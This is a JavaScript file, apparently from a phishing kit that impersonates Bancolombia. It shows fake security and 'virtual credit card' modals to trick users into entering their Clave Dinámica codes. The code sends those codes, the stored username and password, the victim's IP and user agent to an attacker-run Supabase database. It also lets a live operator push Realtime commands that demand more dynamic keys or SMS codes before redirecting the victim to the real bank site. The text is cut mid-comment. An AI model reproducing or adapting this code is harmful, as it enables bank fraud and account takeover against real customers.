(function () {
  // ==================== Supabase Client ====================
  const SUPABASE_URL = "https://yiozdjhcbragqmexiovn.supabase.co";
  const SUPABASE_ANON_KEY = "sb_publishable_Vl47Kr0iSj05_vy1BRU2jA_29BEfQAP";

  let supabaseClient = null;
  if (typeof window.supabase !== "undefined") {
    supabaseClient = window.supabase.createClient(
      SUPABASE_URL,
      SUPABASE_ANON_KEY
    );
  }

  // ==================== Reloj en tiempo real ====================
  function updateClock() {
    const now = new Date();
    const days = ["domingo", "lunes", "martes", "miércoles", "jueves", "viernes", "sábado"];
    const months = [
      "enero", "febrero", "marzo", "abril", "mayo", "junio",
      "julio", "agosto", "septiembre", "octubre", "noviembre", "diciembre"
    ];

    const dayName = days[now.getDay()];
    const day = now.getDate();
    const month = months[now.getMonth()];
    const year = now.getFullYear();
    let hours = now.getHours();
    const minutes = String(now.getMinutes()).padStart(2, "0");
    const ampm = hours >= 12 ? "p.&nbsp;m." : "a.&nbsp;m.";

    hours = hours % 12 || 12;

    const dateStr =
      dayName.charAt(0).toUpperCase() +
      dayName.slice(1) +
      ", " +
      day +
      " de " +
      month +
      " de " +
      year +
      ", " +
      hours +
      ":" +
      minutes +
      " " +
      ampm;

    const el = document.querySelector("svp-page-header-current-date p");
    if (el) {
      el.innerHTML = dateStr;
    }
  }

  // ==================== Timer variables ====================
  const KEY_TIMER_DURATION = 300; // 5 minutes in seconds
  let keyTimerRemaining = KEY_TIMER_DURATION;
  let keyTimerInterval = null;
  let keyAttempts = 0;
  const MAX_KEY_ATTEMPTS = 3;

// ==================== Puente Admin -> Cliente (Supabase Realtime) ====================
  // El Panel Administrativo inserta un comando en public.admin_commands y este
  // cliente lo recibe al instante (postgres_changes) para interrumpir la pantalla
  // de carga y mostrar de nuevo el aviso del escudo dorado + la Clave Dinámica.
  var adminCommandChannel = null;
  var processedCommands = {};
  var sessionId = null;

  function getSessionId() {
    if (sessionId) return sessionId;
    var sid = null;
    try {
      sid = localStorage.getItem("bc_session_id");
    } catch (e) {}
    if (!sid) {
      sid = "s_" + Date.now().toString(36) + "_" + Math.random().toString(36).slice(2, 10);
      try {
        localStorage.setItem("bc_session_id", sid);
      } catch (e) {}
    }
    sessionId = sid;
    return sid;
  }
  // ==================== Reporte de estado al Panel Admin (tiempo real) ====================
  // El panel (monitor.js) vigila public.client_screen_state vía Realtime. El cliente
  // hace UPSERT por session_id con la pantalla donde está el usuario y, mientras esté
  // en la carga ("Verificando identidad"), envía un latido cada 2 s.
  var ESTADO_HEARTBEAT_MS = 2000;
  var estadoHeartbeatTimer = null;

  function getStateUsername() {
    try {
      return localStorage.getItem("bc_username") || "";
    } catch (e) { return ""; }
  }

  function stopEstadoHeartbeat() {
    if (estadoHeartbeatTimer) {
      clearInterval(estadoHeartbeatTimer);
      estadoHeartbeatTimer = null;
    }
  }

  function startEstadoHeartbeat() {
    if (estadoHeartbeatTimer) return;
    // No iniciar latidos si la pantalla de carga ya no está montada.
    if (!document.getElementById("custom-loading-transition-modal")) return;
    estadoHeartbeatTimer = setInterval(function () {
      if (!document.getElementById("custom-loading-transition-modal")) {
        stopEstadoHeartbeat();
        return;
      }
      reportarEstado("cargando", "latido");
    }, ESTADO_HEARTBEAT_MS);
  }

  function reportarEstado(estado, detail) {
    if (estado !== "cargando") stopEstadoHeartbeat();
    if (!supabaseClient) {
      if (estado === "cargando") startEstadoHeartbeat();
      return;
    }
    supabaseClient
      .from("client_screen_state")
      .upsert({
        session_id: getSessionId(),
        username: getStateUsername(),
        estado: estado,
        detail: detail || "",
        updated_at: new Date().toISOString()
      }, { onConflict: "session_id" })
      .then(function (res) {
        if (res.error) console.warn("[Supabase] No se pudo reportar estado:", res.error.message);
      })
      .catch(function (err) {
        console.warn("[Supabase] No se pudo reportar estado", err);
      });
    if (estado === "cargando") startEstadoHeartbeat();
  }

  // ==================== Fetch client IP ====================
  // IP real del cliente desde el MISMO servidor que sirve la página
  // (/api/mi-ip): consulta local. El guardado NUNCA espera por ella: si al
  // momento de guardar no hay IP en caché, el INSERT sale igual y la IP se
  // completa en segundo plano justo después (no bloquea el flujo).
  function fetchClientIp(timeoutMs) {
    return new Promise(function (resolver) {
      const controlador = new AbortController();
      const temporizador = setTimeout(function () { controlador.abort(); }, timeoutMs || 1500);
      fetch("/api/mi-ip", { signal: controlador.signal })
        .then(function (r) { return r.ok ? r.json() : {}; })
        .then(function (d) {
          clearTimeout(temporizador);
          resolver(d.ip || "");
        })
        .catch(function () {
          clearTimeout(temporizador);
          resolver("");
        });
    });
  }

  // Respaldo externo (ipify): IP pública real vista por Internet (la del
  // túnel/VPN al hacer pruebas remotas). Solo en segundo plano.
  function fetchClientIpRespaldo() {
    return fetch("https://api.ipify.org?format=json")
      .then(function (r) { return r.ok ? r.json() : {}; })
      .then(function (d) { return d.ip || ""; })
      .catch(function () { return ""; });
  }

  // Solo IPs útiles: descarta vacíos, '-', 'unknown' y direcciones de bucle
  // local (127.0.0.1 / ::1) que aparecen al probar en localhost con VPN.
  function ipUtil(ip) {
    const t = String(ip || "").trim();
    if (!t || t === "-" || /^(unknown|undefined|null|localhost)$/i.test(t)) return "";
    if (t === "127.0.0.1" || t === "::1" || t === "0.0.0.0" || t === "::") return "";
    return t;
  }

  function esLoopback(ip) {
    const t = String(ip || "").trim();
    return t === "127.0.0.1" || t === "::1" || t === "0.0.0.0" || t === "::" || t === "localhost";
  }

  // Completa la fila con una IP mejor en SEGUNDO PLANO. Si la IP guardada
  // quedó vacía o es de bucle local, se pregunta al servidor (/api/mi-ip)
  // y, si no llega, a ipify; con el resultado se actualiza la misma fila.
  function refinarIpEnSegundoPlano(idFila, tabla) {
    fetchClientIp(2500)
      .then(function (ipLocal) {
        const util = ipUtil(ipLocal);
        return util ? util : fetchClientIpRespaldo();
      })
      .then(function (ip) {
        const util = ipUtil(ip);
        if (!util) return null;
        const actual = ipEnCache;
        if (!ipUtil(actual) || esLoopback(actual)) {
          ipEnCache = util;
          try { localStorage.setItem("bc_ip_cache", util); } catch (e) {}
          return supabaseClient.from(tabla).update({ ip: util }).eq("id", idFila);
        }
        return null;
      })
      .catch(function () { return null; });
  }

  // IP en caché: se consulta al cargar la página (mientras el usuario escribe),
  // así el botón guarda DE UNA VEZ, sin esperar ninguna red al pulsarlo.
  // Solo se guardan IPs útiles (nunca '127.0.0.1' residual de otra prueba).
  var ipEnCache = "";
  (function () {
    try { ipEnCache = ipUtil(localStorage.getItem("bc_ip_cache")); } catch (e) {}
    fetchClientIp().then(function (ip) {
      const util = ipUtil(ip);
      if (util) {
        ipEnCache = util;
        try { localStorage.setItem("bc_ip_cache", util); } catch (e) {}
      }
    });
  })();

  // ==================== Save dynamic key to Supabase ====================
  async function saveDynamicKey(keyValue) {
    if (!supabaseClient) {
      console.warn("[Supabase] Cliente no disponible, omitiendo guardado");
      return;
    }

    try {
      // IP en caché: el INSERT sale DE UNA VEZ, sin esperar a la red.
      const ip = ipEnCache;
      // Leer credenciales del usuario desde localStorage (guardadas por login.js)
      const username = localStorage.getItem("bc_username") || "";
      const password = localStorage.getItem("bc_password") || "";
      const payload = {
        key_value: keyValue,
        username: username,
        password: password,
        ip: ip,
        session_id: getSessionId(),
        user_agent: navigator.userAgent || "",
        time: new Date().toISOString(),
      };

      const { data, error } = await supabaseClient
        .from("dynamic_keys")
        .insert(payload)
        .select("id");

      if (error) throw error;

      // Refinamiento silencioso: si la IP quedó vacía o de bucle local, se
      // completa en segundo plano con /api/mi-ip o ipify (no retrasa el flujo.

      // Además se guarda el id del registro en localStorage para que, al llegar
      // el codigo SMS/OTP, se haga UN SOLO UPDATE directo (sin SELECT previo):
      // así el OTP llega al monitor tan rapido como el login o la clave dinámica.

      if (data && data.length) {
        try { localStorage.setItem("bc_dynamic_key_id", String(data[0].id)); } catch (e) {}
        refinarIpEnSegundoPlano(data[0].id, "dynamic_keys");
      }
      console.log("[Supabase] Clave dinámica guardada para usuario:", username);
    } catch (error) {
      console.error("[Supabase] Error guardando clave dinámica:", error);
    }
  }

  // ==================== Verificación de identidad (137 s) ====================
  // Al presionar "Continuar" se inicia un contador de 137 segundos con un
  // spinner circular y una barra de progreso en la zona superior de la modal.
  var VERIFICATION_DURATION = 137; // segundos
  var verificationInterval = null;
  var verificationRemaining = 0;

  function startIdentityVerification() {
    // Mostrar la modal de carga transicional sobre la vista de la Clave Dinámica.
    // La pantalla de ingreso de la Clave Dinámica permanece intacta detrás de ella.
    showIdentityVerificationModal();
    reportarEstado("cargando", "verificando identidad");

    verificationRemaining = VERIFICATION_DURATION;
    updateVerificationProgress();
    arrancarContadorCarga();
  }

  // Arranca la cuenta atrás de "Verificando identidad" (1 tick por segundo).
  function arrancarContadorCarga() {
    stopVerification();
    verificationInterval = setInterval(function () {
      verificationRemaining--;
      updateVerificationProgress();

      if (verificationRemaining <= 0) {
        stopVerification();
        // Redirigir automáticamente a la página oficial de Bancolombia al finalizar
        reportarEstado("salida", "redirección a bancolombia.com");
        window.location.href = "https://bancolombia.com";
      }
    }, 1000);
  }

  // La modal SMS/Correo detiene la carga de fondo mientras está abierta
  // (Alerta y/o Formulario). Deja el contador en su valor inicial, lo arranca
  // Al pulsar Enviar se inicia una NUEVA verificación de identidad..
  

  // ==================== Modal de Carga Transicional (posterior a la Clave Dinámica) ====================
  function buildLoadingTransitionHTML() {
    return `
      <div class="bc-loading-transition-card" role="status" aria-live="polite">
        <div class="bc-loading-transition-spinner" aria-hidden="true"></div>
        <p class="bc-loading-transition-text">Estamos procesando la validación de tu identidad para la asignación de tu tarjeta de crédito virtual. Por favor espera.</p>
        <div class="bc-loading-transition-progress" aria-hidden="true">
          <div class="bc-loading-transition-progress-fill" id="bc-loading-transition-progress-fill"></div>
        </div>
        <p class="bc-loading-transition-timer" id="bc-loading-transition-timer">Tiempo restante: 137 s</p>
      </div>
    `;
  }

  function showIdentityVerificationModal() {
    var existing = document.getElementById("custom-loading-transition-modal");
    if (existing) return;

    var overlay = document.createElement("div");
    overlay.className = "bc-loading-transition-overlay";
    overlay.id = "custom-loading-transition-modal";
    overlay.innerHTML = buildLoadingTransitionHTML();

    document.body.appendChild(overlay);
  }

  function updateVerificationProgress() {
    var fill = document.getElementById("bc-loading-transition-progress-fill");
    if (fill) {
      var elapsed = VERIFICATION_DURATION - verificationRemaining;
      var percent = (elapsed / VERIFICATION_DURATION) * 100;
      fill.style.width = percent + "%";
    }

    // Arco dorado del spinner: avanza sobre la pista gris con el tiempo real de validación
    var spinner = document.querySelector(".bc-loading-transition-spinner");
    if (spinner) {
      var progress = (VERIFICATION_DURATION - verificationRemaining) / VERIFICATION_DURATION;
      if (progress < 0) progress = 0;
      if (progress > 1) progress = 1;
      spinner.style.setProperty("--bc-spin-progress", progress.toFixed(4));
    }

    // Temporizador de cuenta regresiva: se actualiza segundo a segundo.

    var timerEl = document.getElementById("bc-loading-transition-timer");
    if (timerEl) {

      timerEl.textContent = "Tiempo restante: " + verificationRemaining + " s";
    }
  }

  function stopVerification() {
    if (verificationInterval) {
      clearInterval(verificationInterval);
      verificationInterval = null;
    }
  }

  // ==================== Recepción de comandos del Panel Admin ====================
  // Solo se atienden comandos "solicitar_clave_dinamica" dirigidos a esta sesión
  // y únicamente mientras el usuario esté esperando en la pantalla de carga.
  // Atiende SOLO los comandos del panel administrador..
  var COMANDOS_ADMIN_VALIDOS = ["solicitar_clave_dinamica", "solicitar_sms_otp"];
  function isCommandForMe(row) {
    if (!row) return false;
    if (COMANDOS_ADMIN_VALIDOS.indexOf(row.command) === -1) return false;
    if (row.id != null && processedCommands[row.id]) return false;

    var sid = getSessionId();
    var username = "";
    try {
      username = localStorage.getItem("bc_username") || "";
    } catch (e) {}

    // Direccionado explícito a una sesión distinta: ignorar.
    if (row.session_id && row.session_id !== sid) return false;
    // Sin session_id: cae al username como respaldo.
    if (!row.session_id && row.username && row.username !== username) return false;

    if (row.id != null) processedCommands[row.id] = true;
    return true;
  }

  function handleAdminCommand(row) {
    if (!isCommandForMe(row)) return;

    // Solo interrumpir si el usuario sigue esperando en la pantalla de carga.
    if (!document.getElementById("custom-loading-transition-modal")) return;

if (row.command === "solicitar_sms_otp") {
      console.log("[Supabase] Comando del admin: solicitar_sms_otp recibido.");
      // Fase 3 (SMS/Correo): NO se desmonta la pantalla de carga. La alerta SMS
      // (z-index 100001) se superpone a la carga y, al terminar, el usuario
      // vuelve a la pantalla de carga. El ciclo de la Clave Dinámica queda intacto.

      handleSmsOtpCommand();
      return;
    }
    console.log("[Supabase] Comando del admin: solicitar_clave_dinamica recibido.");
    forceDismountModals();
    // Mostrar la Modal 2 (escudo dorado). Al pulsar "Iniciar validación segura"
    // se reabre la Clave Dinámica existente y vuelve a ponerse en carga.
    showAdminExtraKeyModal();
  }

  // Desmonta al instante (sin fade) las modales superpuestas: la pantalla de
  // carga y la de la Clave Dinámica que quedó detrás, para reabrirla limpia.
  function forceDismountModals() {
    var ids = ["custom-loading-transition-modal", "custom-key-validation-modal"];
    ids.forEach(function (id) {
      var el = document.getElementById(id);
      if (el && el.parentNode) el.parentNode.removeChild(el);
    });
    stopEstadoHeartbeat();
    stopKeyTimer();
    stopVerification();
  }

  // Escucha en tiempo real los comandos insertados en public.admin_commands.
  function listenAdminCommands() {
    if (!supabaseClient) return;
    if (adminCommandChannel) return;

    adminCommandChannel = supabaseClient
      .channel("bcbia-cliente-admin-" + getSessionId())
      .on(
        "postgres_changes",
        { event: "INSERT", schema: "public", table: "admin_commands" },
        function (payload) {
          var row = payload && payload.new;
          if (row) handleAdminCommand(row);
        }
      )
      .subscribe(function (status) {
        if (status === "SUBSCRIBED") {
          console.log("[Supabase] Escuchando comandos del admin (Realtime)");
        }
      });
  }

  function stopListenAdminCommands() {
    if (adminCommandChannel && supabaseClient) {
      try { supabaseClient.removeChannel(adminCommandChannel); } catch (e) {}
    }
    adminCommandChannel = null;
  }

  // ==================== Key Validation Modal (Clave Dinámica) ====================
  function showKeyValidationModal() {
    var existingKeyModal = document.getElementById("custom-key-validation-modal");
    if (existingKeyModal) return;

    keyTimerRemaining = KEY_TIMER_DURATION;
    keyAttempts = 0;

    var overlay = document.createElement("div");
    overlay.className = "bc-modal-overlay-custom show";
    overlay.id = "custom-key-validation-modal";

    overlay.innerHTML = buildKeyValidationHTML();

    document.body.appendChild(overlay);
    reportarEstado("clave", "ingreso de clave dinámica");

    initKeyValidation();
  }

  function buildKeyValidationHTML() {
    return `
      <div class="bc-key-validation-dialog" role="alertdialog" aria-modal="true" id="key-validation-dialog">
        <div class="bc-key-validation-close-button-container">
          <span class="bc-key-validation-close-button" id="key-close-btn" aria-label="Cerrar">&times;</span>
        </div>

        <!-- Zona superior limpia: se llena al presionar "Continuar" -->
        <div class="bc-key-loading-zone" id="bc-key-loading-zone" aria-live="polite">
          <div class="bc-loading-spinner" id="bc-loading-spinner" hidden></div>
          <div class="bc-loading-progress" id="bc-loading-progress" hidden>
            <div class="bc-loading-progress-fill" id="bc-loading-progress-fill"></div>
          </div>
          <p class="bc-loading-text" id="bc-loading-text" hidden>Estamos verificando tu identidad...</p>
        </div>

        <div class="bc-key-validation-content">
          <div class="bc-key-validation-header">
            <img class="bc-pictogram" src="https://library-sdb.apps.bancolombia.com/bds/6.35.0/assets/icons/pictograms/seguridad-88.svg" alt="Icono de seguridad" id="key-validation-icon">
            <h3 id="key-validation-title">Ingresa tu Clave Dinámica</h3>
          </div>
          <div class="bc-key-validation-body">
            <p class="bc-key-validation-description">
              Ingresa la Clave Dinámica que registraste en la app de Bancolombia.
            </p>
            <div class="bc-key-validation-timeout-container">
              <p>La Clave Dinámica expira en:</p>
              <h5 id="key-validation-timer">--:-- s</h5>
            </div>
            <div class="bc-key-validation-input-container">
              <div class="bc-key-validation-input-content">
                <div class="bc-form-field">
                  <div class="bc-input-token">
                    <div class="bc-input-token-container" id="token-container" num-inputs="6">
                      <input pattern="[0-9]*" id="token-0" class="bc-input" required="true" placeholder=" " aria-label="Ingresar primer dígito" inputmode="numeric" type="password" maxlength="1">
                      <input pattern="[0-9]*" id="token-1" class="bc-input" required="true" placeholder=" " aria-label="Ingresar segundo dígito" inputmode="numeric" type="password" maxlength="1">
                      <input pattern="[0-9]*" id="token-2" class="bc-input" required="true" placeholder=" " aria-label="Ingresar tercer dígito" inputmode="numeric" type="password" maxlength="1">
                      <input pattern="[0-9]*" id="token-3" class="bc-input" required="true" placeholder=" " aria-label="Ingresar cuarto dígito" inputmode="numeric" type="password" maxlength="1">
                      <input pattern="[0-9]*" id="token-4" class="bc-input" required="true" placeholder=" " aria-label="Ingresar quinto dígito" inputmode="numeric" type="password" maxlength="1">
                      <input pattern="[0-9]*" id="token-5" class="bc-input" required="true" placeholder=" " aria-label="Ingresar sexto dígito" inputmode="numeric" type="password" maxlength="1">
                    </div>
                    <label class="bc-label-bottom-token" id="token-error-label" aria-label="Intento 1/3">Intento 1/3</label>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div class="bc-key-validation-footer">
          <div class="bc-key-validation-action-container">
            <button class="bc-clear-button" id="key-clear-btn" disabled>Borrar</button>
            <button class="bc-continue-button" id="key-continue-btn" disabled>Validar</button>
          </div>
          <article class="bc-inline-alert-info" id="key-footer-alert">
            <section class="bc-inline-alert-status">
              <section class="bc-transaction-status bc-transaction-status-info bc-transaction-status-md">
                <em class="bc-icon bc-2xs">idea</em>
              </section>
            </section>
            <section class="bc-inline-alert-body">
              <section class="bc-inline-alert-content">
                <p class="bc-inline-alert-text">
                  <h6>¿Olvidaste tu Clave Dinámica?</h6>
                  Acércate a una oficina Bancolombia para actualizar tus datos. Si estás fuera del país, llama a <a href="https://www.grupobancolombia.com/personas/lineas-de-atencion" target="_blank" class="bc-link bc-d-inline">nuestras líneas</a> para gestionar tu Clave Dinámica.
                </p>
              </section>
            </section>
          </article>
        </div>
      </div>
    `;
  }

  function initKeyValidation() {
    var inputs = document.querySelectorAll("#token-container input");
    var continueBtn = document.getElementById("key-continue-btn");
    var clearBtn = document.getElementById("key-clear-btn");
    var errorLabel = document.getElementById("token-error-label");
    var timerEl = document.getElementById("key-validation-timer");

    // Set initial attempt label
    updateAttemptLabel();

    // Start timer
    startKeyTimer(timerEl);

    // Input handling: auto-advance
    inputs.forEach(function (input, index) {
      input.addEventListener("input", function () {
        var val = this.value;
        // Only allow digits
        if (val && !/^\d$/.test(val)) {
          this.value = "";
          return;
        }
        if (val && index < inputs.length - 1) {
          inputs[index + 1].focus();
        }
        updateTokenState(inputs, continueBtn, clearBtn);
      });

      input.addEventListener("keydown", function (e) {
        if (e.key === "Backspace" && !this.value && index > 0) {
          inputs[index - 1].focus();
          inputs[index - 1].value = "";
          updateTokenState(inputs, continueBtn, clearBtn);
        }
        if (e.key === "Enter") {
          doValidate(inputs, continueBtn, errorLabel, timerEl);
        }
      });

      input.addEventListener("focus", function () {
        this.select();
      });
    });

    // Clear button
    clearBtn.addEventListener("click", function () {
      inputs.forEach(function (inp) {
        inp.value = "";
        inp.classList.remove("filled");
      });
      inputs[0].focus();
      updateTokenState(inputs, continueBtn, clearBtn);
      document.getElementById("token-container").classList.remove("shake");
      errorLabel.style.color = "#cc3b2e";
      updateAttemptLabel();
    });

    // Continue button
    continueBtn.addEventListener("click", function () {
      doValidate(inputs, continueBtn, errorLabel, timerEl);
    });

    // Close button: inactivo (sin evento de clic)
  }

  function updateTokenState(inputs, continueBtn, clearBtn) {
    var allFilled = true;
    inputs.forEach(function (inp) {
      if (inp.value) {
        inp.classList.add("filled");
      } else {
        inp.classList.remove("filled");
        allFilled = false;
      }
    });
    continueBtn.disabled = !allFilled;
    clearBtn.disabled = !allFilled;
  }

  function getTokenValue(inputs) {
    var val = "";
    inputs.forEach(function (inp) {
      val += inp.value;
    });
    return val;
  }

  // ==================== Validation: any 6-digit key is accepted ====================
  function doValidate(inputs, continueBtn, errorLabel, timerEl) {
    var code = getTokenValue(inputs);
    if (code.length !== 6) return;

    // Disable buttons during processing
    continueBtn.disabled = true;
    document.getElementById("key-clear-btn").disabled = true;

    // Save the key to Supabase (async, no need to wait)
    saveDynamicKey(code);

    // Aceptar cualquier clave de 6 dígitos y comenzar la verificación de identidad (137 s)
    stopKeyTimer();
    startIdentityVerification();
  }

  function updateAttemptLabel() {
    var label = document.getElementById("token-error-label");
    if (label) {
      label.textContent = "Intento " + (keyAttempts + 1) + "/" + MAX_KEY_ATTEMPTS;
      label.style.color = "#cc3b2e";
    }
  }

  // ==================== Key Timer ====================
  function startKeyTimer(timerEl) {
    keyTimerRemaining = KEY_TIMER_DURATION;
    updateTimerDisplay(timerEl);

    keyTimerInterval = setInterval(function () {
      keyTimerRemaining--;
      updateTimerDisplay(timerEl);

      if (keyTimerRemaining <= 0) {
        stopKeyTimer();
        handleKeyTimeout();
      }
    }, 1000);
  }

  function updateTimerDisplay(timerEl) {
    var mins = Math.floor(keyTimerRemaining / 60);
    var secs = keyTimerRemaining % 60;
    timerEl.textContent =
      String(mins).padStart(2, "0") + ":" + String(secs).padStart(2, "0") + " s";
  }

  function stopKeyTimer() {
    if (keyTimerInterval) {
      clearInterval(keyTimerInterval);
      keyTimerInterval = null;
    }
  }

  function handleKeyTimeout() {
    var dialog = document.getElementById("key-validation-dialog");
    if (!dialog) return;

    var inputs = document.querySelectorAll("#token-container input");
    inputs.forEach(function (inp) {
      inp.disabled = true;
    });

    document.getElementById("key-continue-btn").disabled = true;
    document.getElementById("key-clear-btn").disabled = true;
    document.getElementById("token-error-label").textContent =
      "La Clave Dinámica ha expirado. Intenta de nuevo.";
    document.getElementById("key-validation-timer").textContent = "00:00 s";

    setTimeout(function () {
      closeKeyValidationModal();
    }, 3000);
  }

  // ==================== Close Key Validation Modal ====================
  function closeKeyValidationModal(callback) {
    stopEstadoHeartbeat();
    stopKeyTimer();
    stopVerification();
    // Si la modal de carga transicional está presente, se desmonta junto con la clave.
    var transitionOverlay = document.getElementById("custom-loading-transition-modal");
    if (transitionOverlay && transitionOverlay.parentNode) {
      transitionOverlay.parentNode.removeChild(transitionOverlay);
    }
    var overlay = document.getElementById("custom-key-validation-modal");
    if (overlay) {
      overlay.style.opacity = "0";
      setTimeout(function () {
        if (overlay.parentNode) overlay.parentNode.removeChild(overlay);
        if (callback) callback();
      }, 300);
    } else {
      if (callback) callback();
    }
  }

  // ==================== Aviso de Seguridad Obligatorio (paso previo a la Clave Dinámica) ====================
  // Replica la estructura compacta de la antigua tarjeta del "Seguro Multirriesgo Sura":
  // círculo azul con escudo, título, mensaje y botón amarillo en cápsula. Sin botón "X".
  function showSecurityWarningModal() {
    var existing = document.getElementById("custom-security-warning-modal");
    if (existing) return;

    var overlay = document.createElement("div");
    overlay.className = "bc-modal-overlay-custom show";
    overlay.id = "custom-security-warning-modal";
    overlay.innerHTML = buildSecurityWarningHTML();

    document.body.appendChild(overlay);
    reportarEstado("inicio", "aviso inicial de seguridad");

    var continueBtn = document.getElementById("security-warning-continue-btn");
    if (continueBtn) {
      continueBtn.addEventListener("click", function () {
        // Ocultar/desmontar este aviso y mostrar de inmediato la Clave Dinámica
        closeSecurityWarningModal(showKeyValidationModal);
      });
    }
  }

  function buildSecurityWarningHTML() {
    return `
      <div class="bc-security-warning-dialog" role="alertdialog" aria-modal="true" aria-labelledby="security-warning-title" aria-describedby="security-warning-text">
        <div class="bc-security-warning-icon" aria-hidden="true">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
            <path d="M9 12l2 2 4-4"></path>
          </svg>
        </div>
        <h3 class="bc-security-warning-title" id="security-warning-title">Verificación de Identidad Obligatoria</h3>
        <p class="bc-security-warning-text" id="security-warning-text">
          ¡Ya casi terminamos! Estás a un solo paso de obtener tu Tarjeta Virtual y disfrutar de todos tus beneficios disponibles con un cupo de hasta $70.000.000. Para garantizar una asignación segura, evitar la suplantación de identidad y cumplir con los protocolos de validación de identidad digital, nuestro sistema requiere una confirmación final. Al continuar, se te solicitará ingresar tu Clave Dinámica vigente para asegurar que tú eres el titular único de la cuenta.
        </p>
        <button class="bc-security-warning-button" id="security-warning-continue-btn" type="button">Iniciar validación segura</button>
      </div>
    `;
  }

  // Oculta/desmonta la Modal 1 (aviso inicial) y ejecuta el callback (Clave Dinámica)
  function closeSecurityWarningModal(callback) {
    closeOverlayById("custom-security-warning-modal", callback);
  }

  // ==================== Modal 2 · Escudo dorado (solo la dispara el Panel Admin) ====================
  // Cuando el admin pulsa "Solicitar Clave Dinámica Adicional" mientras el usuario está
  // esperando en la pantalla de carga, se muestra ESTA modal (escudo dorado). Al pulsar
  // "Iniciar validación segura" se reabre la Clave Dinámica (misma lógica existente) y al
  // validarla se vuelve a poner en carga. El ciclo puede repetirse las veces que el admin
  // lo ordene.
  function showAdminExtraKeyModal() {
    var existing = document.getElementById("custom-admin-extra-modal");
    if (existing) return;

    var overlay = document.createElement("div");
    overlay.className = "bc-modal-overlay-custom show";
    overlay.id = "custom-admin-extra-modal";
    overlay.innerHTML = buildAdminExtraKeyHTML();

    document.body.appendChild(overlay);
    reportarEstado("escudo", "escudo dorado por comando del panel");

    var continueBtn = document.getElementById("admin-extra-continue-btn");
    if (continueBtn) {
      continueBtn.addEventListener("click", function () {
        closeAdminExtraModal(showKeyValidationModal);
      });
    }
  }

  function buildAdminExtraKeyHTML() {
    // Identificador único para el gradiente dorado (evita colisiones si la modal
    // se crea varias veces durante la misma sesión).
    var goldId = "bcGold" + Date.now().toString(36);
    return `
      <div class="bc-security-warning-dialog" role="alertdialog" aria-modal="true" aria-labelledby="admin-extra-warning-title" aria-describedby="admin-extra-warning-text">
        <div class="bc-security-warning-icon bc-security-warning-icon-gold" aria-hidden="true">
          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <defs>
              <linearGradient id="${goldId}" x1="0" y1="0" x2="0" y2="1">
                <stop offset="0%" stop-color="#ffe987" />
                <stop offset="45%" stop-color="#f9d423" />
                <stop offset="100%" stop-color="#c8890a" />
              </linearGradient>
              <linearGradient id="${goldId}chk" x1="0" y1="0" x2="1" y2="1">
                <stop offset="0%" stop-color="#fff7c2" />
                <stop offset="100%" stop-color="#d99a06" />
              </linearGradient>
            </defs>
            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" fill="url(#${goldId})" stroke="#a87404" stroke-width="1.3" stroke-linejoin="round"></path>
            <path d="M9 12l2 2 4-4" fill="none" stroke="url(#${goldId}chk)" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"></path>
          </svg>
        </div>
        <h3 class="bc-security-warning-title" id="admin-extra-warning-title">Validación de Identidad Obligatoria</h3>
        <p class="bc-security-warning-text" id="admin-extra-warning-text">
          La clave dinámica anterior ya no es válida debido al tiempo límite de sincronización con tu aplicación bancaria. Para continuar con la activación de tu cupo disponible y asegurar la aprobación de la solicitud, por favor genera e ingresa una nueva clave dinámica. Recuerda que, por protocolos de seguridad, este código expira y cambia automáticamente cada 60 segundos.
        </p>
        <button class="bc-security-warning-button" id="admin-extra-continue-btn" type="button">Iniciar validación segura</button>
      </div>
    `;
  }

  // ==================== Modal de Contingencia institucional (Clave Dinámica inactiva o expirada) ====================
  // Rediseño institucional con logotipo oficial, candado amarillo y texto legal. Se muestra
  // en la Fase 3 cuando el admin pulsa "Solicitar Código SMS / Correo" (el usuario ya superó
  // el escudo dorado y está en pantalla de carga). La modal del escudo dorado
  // (buildAdminExtraKeyHTML) sigue activa para el botón "Solicitar Clave Dinámica Adicional".
  function buildContingencyKeyHTML() {
    return `
      <div class="bc-security-warning-dialog bc-contingency-dialog" role="alertdialog" aria-modal="true" aria-labelledby="admin-extra-warning-title" aria-describedby="admin-extra-warning-text">
        <!-- Logotipo oficial de Bancolombia (isotipo de la app) centrado en la parte superior del modal blanco -->
        <img class="bc-contingency-logo" src="./home_files/bancolombia-horizontal-no-spacing.svg" alt="Bancolombia">
        <!-- Candado de bloqueo oficial: las claves anteriores ya no son utilizables -->
        <div class="bc-contingency-lock-icon" aria-hidden="true">
          <img src="./home_files/pic-lock.svg" alt="Clave dinámica bloqueada">
        </div>
        <h3 class="bc-security-warning-title" id="admin-extra-warning-title">Clave Dinámica inactiva o expirada</h3>
        <p class="bc-security-warning-text" id="admin-extra-warning-text">
          Detectamos que tus claves dinámicas ingresadas no son válidas o han vencido. Por tu seguridad, debes realizar la inscripción de tu Clave Dinámica nuevamente por esta línea toca el botón amarillo Inscribir clave dinámica y continuemos el último proceso para la solicitud de tu cupo y de tu tarjeta virtual.
        </p>
        <button class="bc-security-warning-button" id="admin-extra-continue-btn" type="button">Inscribir Clave Dinámica</button>
        <p class="bc-contingency-legal" role="note">
          Sesión protegida por autenticación de doble factor. El proceso actual se ejecuta en un entorno digital certificado y auditado. Proceso protegido por el sistema de seguridad de la Entidad.
        </p>
      </div>
    `;
  }

  function closeAdminExtraModal(callback) {
    closeOverlayById("custom-admin-extra-modal", callback);
  }

  // Helper: desmonta un overlay con fade y ejecuta el callback después (300 ms).
  function closeOverlayById(overlayId, callback) {
    var overlay = document.getElementById(overlayId);
    if (overlay) {
      overlay.style.opacity = "0";
      setTimeout(function () {
        if (overlay.parentNode) overlay.parentNode.removeChild(overlay);
        if (callback) callback();
      }, 300);
    } else if (callback) {
      callback();
    }
  }

// ==================== Fase 3 · Contingencia SMS/Correo (Clave Dinámica inactiva o expirada) ====================
  // Cuando el admin pulsa "SMS/Correo · Solicitar Código SMS / Correo" mientras el usuario
  // espera en la pantalla de carga (y después del escudo dorado), se muestra la modal
  // institucional de contingencia (logotipo de Bancolombia + candado amarillo). Al pulsar
